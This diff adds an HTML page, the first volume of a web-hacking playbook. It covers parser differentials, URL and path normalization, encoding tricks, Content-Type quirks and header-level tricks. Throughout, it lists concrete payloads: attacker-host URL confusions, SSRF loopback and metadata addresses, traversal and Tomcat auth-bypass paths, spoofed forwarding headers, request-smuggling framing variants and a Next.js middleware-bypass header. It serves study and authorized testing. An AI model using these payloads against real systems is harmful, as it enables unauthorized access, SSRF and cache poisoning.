@@ -1,0 +1,1799 @@
+<!doctype html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Web Hacking Tricks — Playbook</title>
+<style>
+:root{color-scheme:dark;--bg:#050b08;--panel:#0a1510;--panel2:#0c1c14;--line:#1c4831;--green:#6cff98;--bright:#b5ffc6;--dim:#8ab29a;--text:#c3dbc9;--cyan:#68e7d1;--gold:#f1d68b;--rail:272px}
+*{box-sizing:border-box}html{scroll-behavior:smooth;scroll-padding-top:86px}body{background:radial-gradient(ellipse at 48% -12%,#113421 0%,transparent 40%),var(--bg);color:var(--text);margin:0;padding:85px clamp(20px,4.2vw,76px) 110px calc(var(--rail) + clamp(25px,4.5vw,90px));font:15px/1.78 'Cascadia Code','Fira Code','JetBrains Mono',Consolas,'Courier New',monospace;overflow-wrap:anywhere;max-width:none}
+body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:12;background:repeating-linear-gradient(to bottom,transparent 0px,transparent 3px,rgba(65,255,111,.018) 4px);opacity:.65}
+::selection{background:#35ed7a;color:#07130b}a{color:var(--cyan);text-underline-offset:3px;text-decoration-color:#399b87}a:hover{color:#c9fff2;text-decoration-color:currentColor}strong{color:var(--bright);font-weight:700}em{color:#a3ceb0}p,li{max-width:112ch}p{margin:1em 0}li{padding-left:.25rem;margin:.35rem 0}li::marker{color:var(--green)}ul,ol{padding-left:1.6rem}hr{border:0;border-top:1px dashed #245439;margin:2.5rem 0}
+h1,h2,h3{line-height:1.35;letter-spacing:.015em;overflow-wrap:normal}h1{font-size:clamp(1.45rem,2.4vw,2rem);color:var(--bright);border-bottom:1px solid #2c9053;padding:0 0 15px;margin:3.5rem 0 1.25rem;text-shadow:0 0 18px #40ff772b}h1::before{content:'root@research:~# ';display:block;color:var(--green);font:600 12px/1.8 Consolas,monospace;letter-spacing:0;margin-bottom:8px}h2{color:var(--green);font-size:1.25rem;margin:2.8rem 0 1rem;padding:0 0 10px;border-bottom:1px solid var(--line)}h2::before{content:'> ';color:#44ba70}h3{color:#abe8ba;font-size:1.04rem;margin:2rem 0 .8rem}h3::before{content:'$ ';color:#48bb76}
+code{font: .94em/1.5 'Cascadia Code','Fira Code',Consolas,monospace;background:#143020;color:#bdfac9;border:1px solid #28533a;border-radius:4px;padding:.08em .32em;overflow-wrap:anywhere}pre{position:relative;background:linear-gradient(155deg,#0a1d13,#08130e);padding:1.2rem 1.3rem;overflow-x:auto;overflow-wrap:normal;white-space:pre;border:1px solid #24583a;border-left:3px solid #42e57c;border-radius:7px;box-shadow:inset 0 1px 0 #ffffff06,0 14px 30px #0003;margin:1.3rem 0}pre::before{content:'●  ●  ●   /bin/sh';display:block;position:sticky;left:0;margin:-.35rem 0 .9rem;color:#5da577;letter-spacing:.1em;font-size:11px}pre code{background:none;border:0;padding:0;color:#b9f6c8;overflow-wrap:normal;font-size:.91rem;line-height:1.65}blockquote{border-left:3px solid #4cda83;background:#0c2014;margin:1.2rem 0;padding:.8rem 1.3rem;color:#a9cdb4;border-radius:0 7px 7px 0}blockquote p{margin:.3rem 0}
+table{border-collapse:separate;border-spacing:0;width:100%;font-size:.9em;margin:1.25rem 0 1.8rem;border:1px solid var(--line);border-radius:7px;display:block;overflow-x:auto;max-width:100%;box-shadow:0 6px 24px #0002}th,td{border:0;border-bottom:1px solid #1b3828;padding:.65rem .82rem;text-align:left;vertical-align:top;min-width:100px}th{color:var(--bright);font-weight:700;background:#133420;white-space:nowrap}tr:nth-child(even) td{background:#0b1b12}tr:nth-child(odd) td{background:#0a160f}tr:hover td{background:#102819}tr:last-child td{border-bottom:0}
+.terminal-bar{position:fixed;top:0;left:0;right:0;height:54px;z-index:21;background:#08150eeb;backdrop-filter:blur(14px);border-bottom:1px solid #296342;display:flex;align-items:center;gap:14px;padding:0 22px;box-shadow:0 8px 26px #0005}.lights{display:flex;gap:7px}.lights i{display:block;width:9px;height:9px;border-radius:50%;background:#e86b72;box-shadow:0 0 7px #e86b7230}.lights i:nth-child(2){background:#edc368}.lights i:nth-child(3){background:#57d887}.terminal-label{font-size:12px;color:#bcf7c9;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.terminal-label b{color:var(--green)}.bar-right{margin-left:auto;display:flex;align-items:center;gap:14px;white-space:nowrap;color:#7da88b;font-size:11px}.status-dot{display:inline-block;background:#5df88f;width:6px;height:6px;border-radius:50%;margin-right:7px;box-shadow:0 0 8px #5df88f}.progress-track{position:absolute;height:2px;bottom:-1px;left:0;width:100%;background:transparent}.progress-fill{height:100%;width:0;background:var(--green);box-shadow:0 0 9px var(--green)}
+.sidebar{position:fixed;left:0;top:54px;bottom:0;width:var(--rail);background:#09140ef2;border-right:1px solid #204b32;z-index:18;padding:28px 18px 30px;overflow-y:auto;scrollbar-width:thin;scrollbar-color:#235c3b transparent}.side-title{font-size:11px;letter-spacing:.17em;text-transform:uppercase;color:var(--green);border-bottom:1px dashed #285439;padding-bottom:15px;margin-bottom:14px}.side-sub{font-size:10px;color:#769f83;margin:0 0 20px}.sidebar nav a{display:block;color:#96c7a5;text-decoration:none;padding:7px 9px;border-left:2px solid transparent;font-size:11.5px;line-height:1.45;overflow-wrap:anywhere;border-radius:2px}.sidebar nav a:hover,.sidebar nav a.active{color:#d0ffd9;background:#123320;border-left-color:#60ef8f}.sidebar nav a.vol-link{color:var(--green);font-weight:bold;margin-top:15px;font-size:12px}.sidebar nav a.vol-link:first-child{margin-top:0}
+.menu-toggle{display:none;border:1px solid #286e45;color:var(--green);background:#0f2919;border-radius:5px;padding:6px 9px;font:inherit;cursor:pointer}.copy-btn{position:absolute;right:12px;top:9px;padding:4px 8px;font:11px Consolas,monospace;color:#9cefb3;background:#103521;border:1px solid #2c8150;border-radius:4px;cursor:pointer}.copy-btn:hover{background:#1d5532}.footer-note{font-size:11px;color:#658a71;text-align:center;margin-top:55px}
+@media(min-width:1550px){body{padding-right:max(6vw,calc((100vw - 1420px)/2))}}@media(max-width:950px){:root{--rail:240px}body{padding-left:calc(var(--rail) + 24px);padding-right:22px;font-size:14px}}@media(max-width:740px){body{padding:75px 17px 90px;font-size:14px}.terminal-bar{padding:0 12px;gap:10px}.terminal-label{font-size:11px}.bar-right{display:none}.menu-toggle{display:inline-flex}.sidebar{transform:translateX(-101%);transition:transform .2s ease;width:min(82vw,310px);box-shadow:10px 0 30px #0008}.sidebar.open{transform:translateX(0)}h1{margin-top:2.1rem}pre{padding:1rem .85rem}pre code{font-size:12px}th,td{padding:.55rem}.copy-btn{right:7px} }
+@media(prefers-reduced-motion:reduce){html{scroll-behavior:auto}.sidebar{transition:none}}
+</style></head><body><header class="terminal-bar"><div class="lights" aria-hidden="true"><i></i><i></i><i></i></div><button type="button" class="menu-toggle" id="menu-toggle" aria-label="Abrir índice" aria-expanded="false">☰</button><span class="terminal-label"><b>root@websec</b>: ~/research/web-hacking-playbook</span><span class="bar-right"><span><i class="status-dot"></i>SYSTEM ONLINE</span><span>UTF-8 // READ ONLY</span></span><div class="progress-track"><div class="progress-fill" id="reading-progress"></div></div></header><aside class="sidebar" id="sidebar"><div class="side-title">// RESEARCH INDEX</div><div class="side-sub">WEB HACKING TRICKS • 3 VOLUMES</div><nav id="toc" aria-label="Índice de capítulos"></nav></aside>
+<h1 id="web-hacking-tricks-vol-1-foundations">Web Hacking Tricks, Vol. 1 — Foundations</h1>
+<p><strong>Parsers, Encodings, and Trust Boundaries</strong></p>
+<blockquote>
+<p>Companion volumes: <strong>Vol. 2 — Server-Side Primitives</strong> (SSRF, file read/write, injection, deserialization, auth bypass, cache, desync) and <strong>Vol. 3 — Oracles, Chains, Tooling</strong>.
+Grounded in the Web Hacking Techniques Index (webhacklist.com, 2006–2026) plus field practice. Citations point at the primary research so you can read the source, not just the summary.</p>
+</blockquote>
+<hr />
+<h2 id="0-how-to-use-this">0. How to use this</h2>
+<p>Most "uncommon tricks" are not exotic bugs. They are <strong>ordinary bugs found at a boundary nobody tested</strong>, because two components read the same bytes differently. The rare skill is not knowing a payload — it is knowing <em>which two components disagree</em>, and <em>what that disagreement buys you</em>.</p>
+<p>Three rules before anything else:</p>
+<ol>
+<li><strong>A trick is only worth what its sink is worth.</strong> <code>../</code> is worthless alone; <code>../</code> that reaches <code>proxy_pass $uri</code> is request splitting; request splitting that reaches a cache is account takeover.</li>
+<li><strong>Every blind primitive needs an oracle.</strong> Build the oracle before the exploit, or you will burn the primitive guessing.</li>
+<li><strong>Prefer the boring differential over the clever payload.</strong> <code>Host :</code> with a space beats a 400-byte WAF bypass. Nobody patches the boring one.</li>
+</ol>
+<p>This volume is the substrate: the differentials, the encodings, the header and body quirks. Volumes 2 and 3 turn them into primitives and chains.</p>
+<hr />
+<h2 id="1-chain-algebra">1. Chain algebra</h2>
+<p>Write every finding as a triple:</p>
+<pre><code>SOURCE  →  TRANSFORM  →  SINK
+</code></pre>
+<ul>
+<li><strong>Source</strong>: the input you control (query, header, filename, JSON key, uploaded byte, DNS name, email address, redirect target).</li>
+<li><strong>Transform</strong>: decode, normalize, truncate, case-fold, re-serialize, template-render, escape, log, cache, hash.</li>
+<li><strong>Sink</strong>: <code>exec</code>, <code>open</code>, <code>file_get_contents</code>, <code>unserialize</code>, <code>eval</code>, <code>include</code>, SQL string, LDAP filter, template compile, HTTP client, <code>Location:</code>, <code>innerHTML</code>, filesystem write.</li>
+</ul>
+<p>A finding is only a vulnerability when the transform between source and sink is <strong>lossy or asymmetric</strong>. Your job in review and in black-box testing is to find the transform that changes meaning.</p>
+<h3 id="11-the-upgrade-ladder">1.1 The upgrade ladder</h3>
+<p>Primitives are not equal, and they are not final. Every primitive has a next rung:</p>
+<table>
+<thead>
+<tr>
+<th>Primitive</th>
+<th>Immediate next rung</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Reflected input in a header</td>
+<td>CRLF → response splitting → cache poison</td>
+</tr>
+<tr>
+<td>Blind SSRF</td>
+<td>Redirect loop / error-path full read → internal API</td>
+</tr>
+<tr>
+<td>Arbitrary file read</td>
+<td>Source → secrets → session forgery</td>
+</tr>
+<tr>
+<td>Arbitrary file write</td>
+<td>Config file / bytecode cache / webshell → RCE</td>
+</tr>
+<tr>
+<td>Path traversal (read)</td>
+<td>Traversal (write) → overwrite a loaded file</td>
+</tr>
+<tr>
+<td>SQLi (blind)</td>
+<td>File read/write via DB → RCE</td>
+</tr>
+<tr>
+<td>Open redirect</td>
+<td>SSRF allowlist bypass, OAuth code theft</td>
+</tr>
+<tr>
+<td>Content-type control</td>
+<td>Stored XSS on a trusted origin → CSPT/CORS pivot</td>
+</tr>
+<tr>
+<td>Cache deception</td>
+<td>Token theft → ATO</td>
+</tr>
+<tr>
+<td>Info leak (version/path)</td>
+<td>Targeted CVE, exact gadget selection</td>
+</tr>
+<tr>
+<td>DoS</td>
+<td>Race window widening, header loss, CSP loss</td>
+</tr>
+</tbody>
+</table>
+<p>Always ask "what does this become?" before writing the report. A <code>../</code> that only reads <code>/etc/passwd</code> is a low; the same <code>../</code> that reaches <code>~/.ssh/id_rsa</code> is a critical.</p>
+<h3 id="12-oracle-types">1.2 Oracle types</h3>
+<table>
+<thead>
+<tr>
+<th>Oracle</th>
+<th>Signal</th>
+<th>Cost</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Boolean</td>
+<td>status/body/length differs</td>
+<td>cheap, noisy</td>
+</tr>
+<tr>
+<td>Error</td>
+<td>stack trace, DB error, template error</td>
+<td>cheap, often filtered</td>
+</tr>
+<tr>
+<td>Timing</td>
+<td>response latency, render time</td>
+<td>expensive, needs statistics</td>
+</tr>
+<tr>
+<td>Length</td>
+<td><code>Content-Length</code>, ETag hex length, padding</td>
+<td>cheap, precise</td>
+</tr>
+<tr>
+<td>Redirect</td>
+<td><code>Location</code> present/absent</td>
+<td>cheap</td>
+</tr>
+<tr>
+<td>Sort/order</td>
+<td>relative ordering of a probe row</td>
+<td>cheap, underused</td>
+</tr>
+<tr>
+<td>Cross-site</td>
+<td>frame count, <code>onload</code>, cache hit</td>
+<td>needs victim</td>
+</tr>
+<tr>
+<td>Side file</td>
+<td><code>Location</code> header, log line, cache entry</td>
+<td>cheap, persistent</td>
+</tr>
+</tbody>
+</table>
+<p>Prefer <strong>error</strong> and <strong>length</strong> oracles; they are the most precise per request. Timing is the fallback, not the default.</p>
+<hr />
+<h2 id="2-parser-differentials-the-master-key">2. Parser differentials: the master key</h2>
+<p>Two parsers, one document, two meanings. That is the whole class. It shows up as WAF bypass, auth bypass, cache poisoning, smuggling, XSS, SSRF filter bypass, and RCE.</p>
+<p><strong>Where the two parsers live:</strong></p>
+<ul>
+<li>WAF/CDN vs origin framework</li>
+<li>Reverse proxy vs application server</li>
+<li>Framework router vs authorization middleware</li>
+<li>Validator vs consumer (JSON schema vs <code>json.loads</code>, YAML lint vs <code>yaml.load</code>)</li>
+<li>Sanitizer vs browser</li>
+<li>Signature verifier vs attribute reader (SAML, JWT, XML-DSig)</li>
+<li>Cache key builder vs origin router</li>
+<li>Front-end JS vs back-end parser</li>
+<li>Archive lister vs archive extractor</li>
+<li>File-extension check vs file-type sniffer</li>
+<li>CLI wrapper vs the tool it invokes</li>
+</ul>
+<p><strong>The generic method:</strong></p>
+<ol>
+<li>Model the validator's grammar. Find what it <em>cannot</em> represent.</li>
+<li>Find a byte sequence the validator accepts as benign but the consumer reinterprets.</li>
+<li>Confirm the disagreement with a harmless probe (a canary, a 200-vs-500, a length delta).</li>
+<li>Only then weaponize.</li>
+</ol>
+<p><strong>Canonical examples worth memorizing:</strong></p>
+<ul>
+<li><code>Content-Type: application/json;,text/html</code> — MIME libs split on <code>;</code> and take the first; Chromium/Firefox split on <code>,</code> and take the last valid type. Passes a JSON check, renders as HTML despite <code>nosniff</code>. (<a href="https://lab.ctbb.show/research/parse-and-parse-mime-validation-bypass-to-xss-via-parser-differential">Parse and Parse</a>)</li>
+<li>Duplicate JSON keys — validators that <code>JSON.parse</code> and take first-wins vs consumers that take last-wins (or vice versa). Also <code>__proto__</code> vs <code>constructor.prototype</code>.</li>
+<li>YAML <code>&lt;&lt;</code> merge keys and explicit <code>!!merge</code> resolve differently across Go/Ruby/Node/Python. (<a href="https://blog.darkforge.io/yaml/merge/parser/differential/research/2026/02/11/YAML-Merge-Tags-and-Parser-Differentials.html">YAML Merge Tags</a>)</li>
+<li>ZIP entry names: the lister uses one API, the extractor another; a traversing name is invisible to the check and honoured by the write. (<a href="https://blog.isec.pl/disguises-zip-past-path-traversal/">Disguises Zip Past Path Traversal</a>)</li>
+<li>XML round-trip: parse then re-serialize changes the document, so the signature covers something else. (<a href="https://portswigger.net/research/saml-roulette-the-hacker-always-wins">SAML roulette</a>)</li>
+<li>Nginx <code>$uri</code> is normalized and URL-decoded, so <code>%0d%0a</code> in the path injects headers into the upstream request. (<a href="https://portswigger.net/research/crlf-powered-desync-attacks">CRLF-Powered Desync</a>)</li>
+</ul>
+<p><strong>Tooling:</strong> <a href="https://github.com/narfindustries/http-garden">http-garden</a> differential-fuzzes HTTP servers/proxies side by side; <a href="https://www.jianjunchen.com/p/wafmanis.sp24.pdf">WAF Manis</a> does it for WAF-vs-framework; <code>diff</code> two parsers locally for anything else.</p>
+<hr />
+<h2 id="3-url-parsing">3. URL parsing</h2>
+<p>URLs are the highest-yield differential surface on the web: every SSRF filter, allowlist, redirect check, cache key, and signature is built on a URL parser, and every one of them disagrees with the next.</p>
+<h3 id="31-authority-confusion">3.1 Authority confusion</h3>
+<pre><code>https://expected.com@attacker.com/          # userinfo; browser goes to attacker.com
+https://attacker.com#@expected.com          # fragment hides the real host from naive regex
+https://expected.com\.attacker.com          # backslash read as &quot;/&quot; by Chrome, as a char by many libs
+https://expected.com%2f@attacker.com        # encoded slash inside userinfo
+https://attacker.com?@expected.com          # &quot;?&quot; before &quot;@&quot;
+http://127.0.0.1:80@attacker.com            # port inside userinfo
+https://attacker.com:443@expected.com
+</code></pre>
+<p>Any validator doing <code>url.startswith("https://expected.com")</code> or <code>"expected.com" in url</code> falls to the first, second, or fifth form.</p>
+<h3 id="32-loopback-and-internal-address-spellings">3.2 Loopback and internal-address spellings</h3>
+<pre><code>http://127.0.0.1/            http://127.1/
+http://2130706433/           # decimal
+http://0x7f000001/           # hex
+http://0177.0.0.1/           # octal
+http://[::1]/                http://[::ffff:127.0.0.1]/
+http://[0:0:0:0:0:ffff:7f00:1]/
+http://127.0.0.1.nip.io/     http://127.0.0.1.sslip.io/
+http://localhost./           # trailing dot
+http://LOCALHOST/
+http://127.0.0.1:80#@attacker.com
+</code></pre>
+<p>Also: <code>http://0/</code> (Linux resolves to 0.0.0.0 → localhost on many stacks), <code>http://[::]/</code>, <code>http://169.254.169.254.nip.io/</code>, and <code>http://metadata.google.internal/</code>.</p>
+<h3 id="33-scheme-confusion">3.3 Scheme confusion</h3>
+<pre><code>http:attacker.com                 # no slashes
+https:/\/attacker.com             # mixed slashes
+//attacker.com                    # protocol-relative
+http:///attacker.com              # triple slash: Python urlsplit sees no netloc
+http://attacker.com\@expected.com
+javascript:alert(1)//https://expected.com
+java\nscript:alert(1)             # tab/newline inside the scheme
+</code></pre>
+<p><code>http:///host</code> is the important one: Python's <code>urlsplit</code> returns <code>netloc=''</code> and <code>path='/host'</code>, so a validator sees a relative path while the fetcher resolves a host. (<a href="https://blog.xss.am/2023/08/cve-2023-39968-jupyter-token-leak/">Jupyter token leak</a>)</p>
+<p>U+2028 inside a scheme token splits the string for the checker but not the resolver — this survived Chrome's Sanitizer API. (<a href="https://slcyber.io/research-center/two-bypasses-for-chromes-sanitizer-api/">Two Bypasses for Chrome's Sanitizer API</a>)</p>
+<h3 id="34-credentials-and-crlf">3.4 Credentials and CRLF</h3>
+<pre><code>http://user%0d%0aX-Injected:%20yes@host/
+http://user:pass@host/
+http://a:b:c@host/                # second &quot;:&quot; — parsers disagree on the password
+</code></pre>
+<p>CRLF in the userinfo reaches servers that build an <code>Authorization: Basic</code> header or a proxy request line from the parsed parts. Same trick reaches <code>Proxy-Authorization</code> in forward proxies.</p>
+<h3 id="35-redirect-chain-tricks">3.5 Redirect-chain tricks</h3>
+<ul>
+<li><strong>Loop to error</strong>: a redirect loop that walks the status code up through 3xx drives a client into its error path, which often returns the <em>full</em> response body where success returned nothing. (<a href="https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/">Novel SSRF Technique Involving HTTP Redirect Loops</a>)</li>
+<li><strong>307/308 preserve method and body</strong>: use an image proxy or CDN endpoint as a redirect gadget to move a POST (with its body) to a sibling host. (<a href="https://blog.voorivex.team/cloudflare-image-proxy-as-a-cspt-gadget-a-cross-origin-cspt-exploit">Cloudflare Image Proxy as a CSPT Gadget</a>)</li>
+<li><strong>Redirect to <code>file://</code>/<code>gopher://</code></strong>: many HTTP clients follow a 30x into a non-HTTP scheme.</li>
+<li><strong>Redirect to yourself with a different Host</strong>: splits what the allowlist checked from what is fetched.</li>
+</ul>
+<p>Full payload corpus: <a href="https://portswigger.net/research/introducing-the-url-validation-bypass-cheat-sheet">URL Validation Bypass Cheat Sheet</a>.</p>
+<hr />
+<h2 id="4-path-normalization-and-routing">4. Path normalization and routing</h2>
+<p>Path handling is where front-end ACLs die. The proxy matches a prefix; the backend resolves a different file.</p>
+<h3 id="41-traversal-that-survives-checks">4.1 Traversal that survives checks</h3>
+<pre><code>..%2f            ..%2F            %2e%2e%2f
+..%252f          %252e%252e%252f  # double-encoded, decoded twice downstream
+..\              ..\\             # Windows
+....//           ....\/           # naive strip-one-layer filters
+..%c0%af         ..%c0%2f         # overlong UTF-8
+..%e0%80%af
+</code></pre>
+<h3 id="42-segment-tricks">4.2 Segment tricks</h3>
+<pre><code>/admin/..;/admin/panel        # Tomcat semicolon path params
+/..;/admin                    # proxy sees /..;/, Tomcat strips it
+/.;/admin
+/admin;jsessionid=x/../panel
+//admin//panel                # duplicate slashes
+/admin/.                      # trailing dot segment
+/admin%20                    # trailing space (Windows trims)
+/ADMIN                        # case-insensitive FS
+/admin.php%3Ffoo.php          # Apache truncates r-&gt;filename at encoded &quot;?&quot;
+/admin.php/foo.php            # PATH_INFO
+/admin.php;.css
+/admin/../admin/panel
+</code></pre>
+<p><code>/..;/</code> is the canonical auth-bypass primitive against Tomcat/Spring behind Nginx. (<a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf">Breaking Parser Logic</a>)</p>
+<p><code>admin.php%3Fooo.php</code> works because <code>mod_rewrite</code> treats <code>r-&gt;filename</code> as a URL and truncates at <code>?</code>, so <code>&lt;Files admin.php&gt;</code> auth never matches, while PHP-FPM splits the <code>?</code> back off and runs <code>admin.php</code>. (<a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-en/">Confusion Attacks</a>)</p>
+<h3 id="43-static-file-fallthrough">4.3 Static-file fallthrough</h3>
+<pre><code>/admin/panel/logo.png     # cache deception
+/admin/panel.json
+/admin/panel/
+/admin/panel%00.css
+/admin/panel/..%2fpanel
+</code></pre>
+<p>Any route that appends a "static" suffix and still resolves the dynamic handler is a cache-deception candidate. The mirror case is a static handler that resolves <em>up</em> into the app root.</p>
+<h3 id="44-java-specific-routing">4.4 Java-specific routing</h3>
+<p>Java stacks resolve <code>;</code> matrix params, <code>%2F</code>, and encoded dots differently from every proxy in front of them. <code>UABScan</code> found 94 auth-bypass candidates across 529 apps from exactly this. (<a href="https://racerz-fighting.github.io/paper/uabscan-ccs25.pdf">paper</a>)</p>
+<hr />
+<h2 id="5-encoding-unicode-charset">5. Encoding, Unicode, charset</h2>
+<h3 id="51-charset-omission">5.1 Charset omission</h3>
+<p>A <code>Content-Type</code> without <code>charset</code> lets the browser auto-detect. Injecting an ISO-2022-JP escape sequence flips the assumed charset mid-body, so the byte you used to escape a quote renders as something else. (<a href="https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/">Encoding Differentials</a>)</p>
+<pre><code class="language-html">&lt;meta charset=&quot;iso-2022-jp&quot;&gt;  &lt;!-- or inject ESC $ B --&gt;
+</code></pre>
+<h3 id="52-best-fit-narrowing">5.2 Best-fit / narrowing</h3>
+<p>Windows converts UTF-16 to ANSI with <strong>best-fit</strong> mappings <em>after</em> escaping:</p>
+<table>
+<thead>
+<tr>
+<th>Unicode</th>
+<th>ANSI byte</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>U+FF02 fullwidth quote</td>
+<td><code>"</code></td>
+<td>closes a quoted argument</td>
+</tr>
+<tr>
+<td>U+00A5 yen</td>
+<td><code>\</code></td>
+<td>becomes a path separator</td>
+</tr>
+<tr>
+<td>U+2015 horizontal bar</td>
+<td><code>—</code>→<code>-</code></td>
+<td>option confusion</td>
+</tr>
+<tr>
+<td>soft hyphen U+00AD</td>
+<td><code>-</code></td>
+<td>option confusion</td>
+</tr>
+</tbody>
+</table>
+<p><code>escapeshellarg()</code> and <code>list2cmdline()</code> escape first; <code>GetCommandLineA</code>/CRT converts second, undoing the escape. (<a href="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/">WorstFit</a>)</p>
+<p>Java has the mirror bug: <code>(byte) ch</code> and <code>ch &amp; 0xFF</code> drop the high 8 bits ("ghost bits"), so a fullwidth character whose low byte is <code>'</code> passes a WAF as Unicode and becomes a quote at the sink. (<a href="https://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf">Cast Attack</a>)</p>
+<h3 id="53-normalization">5.3 Normalization</h3>
+<ul>
+<li>NFC/NFD: <code>é</code> as one codepoint vs <code>e</code>+combining accent — different byte lengths, different hash, same glyph.</li>
+<li>Case folding: <code>İ</code> (U+0130) lowercases to two codepoints in JS, one in ICU. A blocklist on <code>i</code> misses it. (<a href="https://web.archive.org/web/20260418230027/https://mizu.re/post/fcsc-2026-writeups">FCSC 2026</a>)</li>
+<li>Confusables: Cyrillic <code>а</code>, Greek <code>ο</code>, <code>ⅼ</code> (Roman numeral fifty) in identifiers and domains.</li>
+<li><code>ß</code> → <code>ss</code> under some folds; Turkish dotless <code>ı</code>.</li>
+</ul>
+<h3 id="54-truncation">5.4 Truncation</h3>
+<ul>
+<li>Mid-sequence UTF-8 truncation leaves a dangling lead byte that swallows the next character.</li>
+<li>255-byte filename limits, 4096-byte header limits, 8 KB request-line limits: pad to truncate a suffix check.</li>
+<li><code>%00</code> truncates C strings: <code>shell.php%00.jpg</code>, <code>admin%00.html</code>.</li>
+</ul>
+<h3 id="55-overlong-encodings">5.5 Overlong encodings</h3>
+<p><code>%c0%ae</code> = <code>.</code>, <code>%c0%af</code> = <code>/</code>, <code>%c1%9c</code> = <code>\</code>. Decoders that accept overlong forms disagree with decoders that reject them.</p>
+<hr />
+<h2 id="6-content-type-and-mime">6. Content-Type and MIME</h2>
+<h3 id="61-comma-lists">6.1 Comma lists</h3>
+<p><code>Content-Type</code> is a singleton field, but parsers disagree:</p>
+<ul>
+<li>MIME libraries: split at first <code>;</code>, keep first type.</li>
+<li>Chromium/Firefox: split on <code>,</code>, keep <strong>last syntactically valid</strong> type.</li>
+</ul>
+<pre><code>Content-Type: application/json;,text/html
+Content-Type: image/png,text/html
+Content-Type: text/plain,text/html
+Content-Type: application/json, text/html; charset=utf-8
+</code></pre>
+<p>This defeats prefix, suffix, regex, and substring allowlists and survives <code>X-Content-Type-Options: nosniff</code>. (<a href="https://speakerdeck.com/flatt_security/xss-using-dirty-content-type-in-cloud-era">XSS using dirty Content Type</a>)</p>
+<h3 id="62-duplicate-headers">6.2 Duplicate headers</h3>
+<p>Two <code>Content-Type</code> headers: the framework takes the first, the WAF the last, or the reverse. Same for <code>Content-Disposition</code>, <code>Content-Length</code>, <code>Transfer-Encoding</code>.</p>
+<h3 id="63-sniffing">6.3 Sniffing</h3>
+<ul>
+<li>IE sniffs <code>text/plain</code> and <code>message/rfc822</code> (<code>.eml</code>) — HTML inside renders. (<a href="https://web.archive.org/web/20180808171731/https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/">Text/Plain Considered Harmful</a>)</li>
+<li>Chrome sniffs some types when <code>nosniff</code> is absent; the comma trick works even when it is present.</li>
+<li>Object storage lets you <em>set</em> the type on upload: <code>text/html</code> on a public bucket is stored XSS on the bucket origin. On S3 you need a signed request; on MinIO an anonymous override suffices. (<a href="https://blog.voorivex.team/content-type-override-to-stored-xss-on-public-objects">Content-Type Override to Stored XSS</a>)</li>
+</ul>
+<h3 id="64-charset-in-multipart">6.4 Charset in multipart</h3>
+<p>A harmless <code>charset</code> in a <em>later</em> multipart part overwrites the captured value from an earlier dangerous one in OWASP CRS. (<a href="https://habr.com/ru/articles/984632/">CVE-2026-21876</a>)</p>
+<h3 id="65-disposition">6.5 Disposition</h3>
+<p><code>Content-Disposition: inline</code> renders; <code>attachment</code> downloads. A filename with <code>%0d%0a</code> splits the header. <code>filename*=</code> (RFC 5987) and <code>filename=</code> can disagree, so the validator checks one name and the disk gets the other.</p>
+<hr />
+<h2 id="7-header-level-tricks">7. Header-level tricks</h2>
+<h3 id="71-duplicates-and-precedence">7.1 Duplicates and precedence</h3>
+<pre><code>Host: expected.com
+Host: attacker.com
+X-Forwarded-Host: attacker.com
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-Proto: https
+X-Forwarded-Port: 443
+X-Real-IP: 127.0.0.1
+Forwarded: for=127.0.0.1;host=attacker.com;proto=https
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Forwarded-Prefix: /admin
+</code></pre>
+<p>Different layers take the first, the last, or join with <code>,</code>. <code>X-Forwarded-Host</code> reaching an absolute-URL builder is password-reset poisoning; reaching a router is auth bypass.</p>
+<h3 id="72-whitespace-and-folding">7.2 Whitespace and folding</h3>
+<pre><code>Host : expected.com          # space before colon
+Host:  expected.com          # double space
+Host:\texpected.com          # tab
+Host: expected.com\t
+X-Foo: a
+ b                            # obs-fold continuation
+</code></pre>
+<p>Folded headers hide a payload from a WAF that reads one line while the backend unfolds it. (<a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies">Exploiting HTTP Parser Inconsistencies</a>)</p>
+<h3 id="73-bare-cr-and-bare-lf">7.3 Bare CR and bare LF</h3>
+<p>Some parsers split on <code>\n</code> alone, some on <code>\r\n</code>, some on <code>\r</code>. A bare CR inside a value ends the header for one layer and not the other. This is the basis of SMTP smuggling and several header-injection bypasses.</p>
+<h3 id="74-trailers">7.4 Trailers</h3>
+<pre><code>Trailer: X-Admin
+TE: trailers
+...
+0
+X-Admin: true
+</code></pre>
+<p>Trailers are merged into the header section by ~a third of implementations, bypassing proxy ACLs and vhost checks that only inspect the header block. (<a href="https://www.sebsrt.xyz/blog/trailing-danger/">Trailing Danger</a>)</p>
+<h3 id="75-framing-headers">7.5 Framing headers</h3>
+<pre><code>Transfer-Encoding: chunked
+Transfer-Encoding: chunked, chunked
+Transfer-Encoding: gzip, chunked
+Transfer-Encoding: identity, chunked
+Content-Length: 0
+Content-Length: 5
+Content-Length: 5, 5
+</code></pre>
+<p>See Vol. 2 §11 for exploitation.</p>
+<h3 id="76-internal-framework-headers">7.6 Internal framework headers</h3>
+<pre><code>x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
+x-now-route-matches: 1
+Rsc: 1
+Next-Router-State-Tree: ...
+X-Middleware-Prefetch: 1
+</code></pre>
+<p>These make Next.js skip middleware (auth bypass) or serve a static/cacheable variant (poisoning). (<a href="https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware">corrupt middleware</a>, <a href="https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir">stale elixir</a>)</p>
